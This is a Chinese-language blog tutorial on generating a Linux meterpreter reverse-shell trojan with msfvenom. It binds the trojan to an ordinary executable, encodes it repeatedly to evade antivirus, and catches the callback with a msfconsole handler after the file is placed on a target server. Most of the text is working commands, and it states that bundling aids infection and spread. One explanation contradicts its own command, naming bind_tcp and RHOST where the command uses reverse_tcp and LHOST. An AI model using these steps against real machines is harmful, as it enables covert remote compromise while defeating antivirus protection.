---
legacyHtml: true
legacySymbols: 4507
title: Metasploit 木马编译利用
date: "2022-04-02T15:29:09.000Z"
updated: "2025-01-21T06:58:19.686Z"
tags:
  - Trojan horse
  - Linux
  - Kali
  - Metasploit
categories:
  - CyberSecurity
  - 木马
cover: >-
  https://res.cloudinary.com/sycamore/image/upload/v1682442126/Typera/2023/04/87d91c5d20cc130aa72fe99c74a9e8c2.png
description: "Metasploit 是一个开源的，可用来发现、验证并利用漏洞的渗透测试平台。 Kali 中默认安装了 Metasploit 框架。 # msfvenom 命令实现木马生成、捆绑以及免杀处理 简介： msfvenom 是 Metasploit 中的一个命令。 msfvenom 命令结合了 msfpayload 和 msfencoder 的功能，能够生成木马，"
---

<div class="note default">
<p><strong>Metasploit</strong> 是一个开源的，可用来<strong>发现</strong>、<strong>验证</strong>并<strong>利用</strong>漏洞的渗透测试平台。</p>
<p>Kali 中默认安装了 <strong>Metasploit</strong> 框架。</p>
</div>
<h2 id="msfvenom-命令实现木马生成-捆绑以及免杀处理"><a class="anchor" href="#msfvenom-命令实现木马生成-捆绑以及免杀处理">#</a> msfvenom 命令实现木马生成、捆绑以及免杀处理</h2>
<p><strong>简介：</strong></p>
<p><strong>msfvenom</strong> 是 <strong>Metasploit</strong> 中的一个命令。</p>
<p><strong>msfvenom</strong> 命令结合了 msfpayload 和 msfencoder 的功能，能够<strong>生成木马</strong>，并实现木马编码<strong>免杀</strong>和避免坏字符、捆绑木马等。</p>
<h3 id="msfvenom-命令用法"><a class="anchor" href="#msfvenom-命令用法">#</a> msfvenom 命令用法</h3>
<p>涉及到的<strong>选项</strong>有：</p>
<p><strong>-l</strong>：列出指定<strong>模块</strong>（包括 payloads, encoders, nops, platforms, archs, encrypt, formats, all）的所有可用<strong>资源</strong>。其中 <strong>payloads</strong> 对应的就是<strong>木马</strong>。</p>
<p><strong>-p</strong>：指定需要使用的 <strong>payload</strong> ，可以指定 ‘-’ 或者 stdin 来<strong>自定义</strong> payload。<br />
如果不知道 payload 包括哪些选项，可以使用  <code>--list-options</code>  列出 payload 的标准选项。</p>
<p><strong>-f</strong>：指定 payload 的<strong>输出格式</strong>，可以使用  <code>--list formats</code>  来列出可选的格式。</p>
<p><strong>-o</strong>：指定输出的 payload 的<strong>保存路径</strong>，也可以采用<strong>重定向</strong>的方式来替代 - o 选项。</p>
<p><strong>-x</strong>： 指定一个<strong>自定义</strong>的<strong>可执行文件</strong>作为模板。即，把木马<strong>捆绑</strong>到指定的可执行文件上。</p>
<p><strong>-e</strong>：指定使用的<strong>编码器</strong>（）。</p>
<p><strong>-i</strong>： 指定对 payload 编码的<strong>次数</strong></p>
<h3 id="木马生成"><a class="anchor" href="#木马生成">#</a> 木马生成</h3>
<ol>
<li>先使用  <code>msfvenom -l payloads</code>  命令，查看<strong>可用的木马</strong>。<br />
因为可用的木马有<strong>很多</strong>，所以可以根据所需木马的特性、结合 <strong>grep</strong> 限定木马的种类 <img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442146/Typera/2023/04/ebeb726eacc7fad3302b80554fb13af1.png" alt="image-20230426010221520" /><br />
 以木马  <code>linux/x86/meterpreter/reverse_tcp</code> （反向连接) 作为样例，<br />
&lt;br&gt;</li>
<li>查看该木马<strong>需要设置的选项</strong>：<br />
 <code>msfvenom -p linux/x86/meterpreter/reverse_tcp --list-options</code> <img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442254/Typera/2023/04/874f3751e4961c5140e9e30ca40f22e7.png" alt="image-20230426010409894" /></li>
</ol>
<p>&lt;br&gt;</p>
<ol start="3">
<li>
<p>查看可指定的<strong>输出格式</strong>：<br />
 <code>msfvenom --list formats</code> <img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442270/Typera/2023/04/38ea1bb4d485262080541e030e6fc0a3.png" alt="image-20230426010426398" /><br />
&lt;br&gt;</p>
</li>
<li>
<p>参考上面得到的信息，构造<strong>生成木马</strong>的命令：<br />
 <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.158.132 LPORT=4444 -f elf -o /root/payload.elf</code> <img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442278/Typera/2023/04/09553b61c2c9d88fe78ede3ea742468a.png" alt="image-20230426010433724" /></p>
</li>
</ol>
<p>其中，<strong>-p</strong> 选择生成的木马为：<strong>linux/x64/shell_bind_tcp</strong>；<br />
<strong>RHOST</strong> 指定将要攻击的<strong>目标主机</strong>的<strong> IP</strong>；<br />
<strong>LPORT</strong> 指定对应端口号（默认为 4444，故可以不写）；<br />
<strong>-f</strong> 指定生成木马文件的文件<strong>类型</strong>为 <strong>elf</strong><br />
<strong>-o</strong> 指定保存生成的木马文件的<strong>地址</strong>为：<strong>/root/payload.elf</strong></p>
<h3 id="木马捆绑"><a class="anchor" href="#木马捆绑">#</a> 木马捆绑</h3>
<p>通常情况下，木马会和正常的文件<strong>捆绑</strong>在一起，方便木马进行<strong>感染</strong>和<strong>传播</strong>。</p>
<p>所以，我们要事先准备好一个用于<strong>绑定</strong>的文件，这里选用的是  <code>/root/hello_world</code> （ <strong>gcc</strong> 编译的一个简单的 C 程）。</p>
<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.158.132 LPORT=4444 -f elf -x /root/hello_world -o /root/payload_bundle.elf</code> <br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442285/Typera/2023/04/c7bc72a382ae694be589d6a5cb25a3de.png" alt="image-20230426010440843" /></p>
<p>其中，<strong>-x</strong> 指定<strong>绑定</strong>的可执行文件为  <code>/root/hello_world</code> ，其余项与生成木马的指令一致。</p>
<h3 id="木马免杀"><a class="anchor" href="#木马免杀">#</a> 木马免杀</h3>
<p>在杀毒软件泛滥的今天，不对木马文件进行免杀处理很难通过<strong>杀软的检查</strong>，所以需要对木马进行<strong>免杀</strong>处理。</p>
<p>查看可用的编码器： <code>msfvenom -l encoders</code> <br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442290/Typera/2023/04/d9aa39a90db02fe251a93aff3dd31cb7.png" alt="image-20230426010444808" /></p>
<p>选用<strong>免杀</strong>效果较好的 <strong>x86/shikata_ga_nai</strong> 编译器进行编码。<br />
命令： <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.158.132 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f elf -x /root/hello_world -o /root/payload_Anti_Virus.elf</code> <br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442294/Typera/2023/04/9f32f881202e4a535bac4f5ce0f8c517.png" alt="image-20230426010449517" /></p>
<p>其中，<strong>-e</strong> 指定编译器为 <strong>x86/shikata_ga_nai</strong>，<br />
<strong>-i</strong> 指定编码的次数为 5 次。<br />
编码 <strong>5</strong> 次的木马，基本可以<strong>躲避部分</strong>杀软的查杀，</p>
<p>当然可以对木马进行<strong>更多次</strong>的编码，这样可以<strong>提高</strong>木马的<strong>免杀机率</strong>，但是需要注意：这也可能会导致木马<strong>不可使用</strong>。</p>
<h2 id="msfconsole-木马利用"><a class="anchor" href="#msfconsole-木马利用">#</a> msfconsole 木马利用</h2>
<p>使用之前生成的木马文件： <strong>payload.elf</strong>。</p>
<h3 id="攻击端"><a class="anchor" href="#攻击端">#</a> 攻击端：</h3>
<p>输入命令  <code>msfconsole</code>  打开 <strong>MSF 控制台</strong><br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442298/Typera/2023/04/2c2e815f13d049741cd9371ace771daa.png" alt="image-20230426010454524" /></p>
<p>输入命令： <code>use exploit/multi/handler</code> ，选择 exploit 模块</p>
<p>然后，可以输入命令  <code>show options</code>  查看<strong>设置的参数</strong>（查看还要设置哪些）<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1704010005/Typera/2023/12/4a6d04ee3788a771e9fe642e64fa8104.png" alt="trojan-horse10" /></p>
<p>命令  <code>set PAYLOAD linux/x86/meterpreter/reverse_tcp</code>  ，设置 <strong>PAYLOAD</strong><br />
 命令  <code>set LHOST 192.168.158.132</code> ，设置 local host 的<strong> IP</strong></p>
<p>命令  <code>run</code>  开始<strong>监听</strong>对应的端口，等待<strong>目标服务器</strong>执行<strong>木马</strong>后，就能获得 <strong>shell</strong>。<br />
如下图所示：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442304/Typera/2023/04/8b2780434593170f1b8173cf9fa13836.png" alt="image-20230426010500036" /></p>
<h3 id="目标服务器"><a class="anchor" href="#目标服务器">#</a> 目标服务器：</h3>
<p>用各种方式将<strong>木马文件</strong>传到<strong>目标服务器</strong>上，</p>
<p>命令  <code>chmod +x payload.elf</code>  更改文件执行权限</p>
<p>执行 <strong>payload.elf</strong> 文件（<strong>顺序</strong>：要在攻击端开始监听之后执行）：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442311/Typera/2023/04/80d816c18312f780f743c4b82696c43f.png" alt="image-20230426010506608" /></p>
<p>整理一下：</p>
<ul>
<li>攻击端：</li>
</ul>
<ol>
<li><code>msfconsole</code></li>
<li><code>use exploit/multi/handler</code></li>
<li><code>set PAYLOAD linux/x86/meterpreter/reverse_tcp</code> <br />
4. <code> set LHOST 192.168.158.132</code></li>
<li><code>run</code> ，开始监听</li>
</ol>
<ul>
<li>目标服务器：</li>
</ul>
<ol>
<li>下载木马文件</li>
<li><code>chmod +x payload.elf</code></li>
<li><code>./ payload.elf</code></li>
</ol>
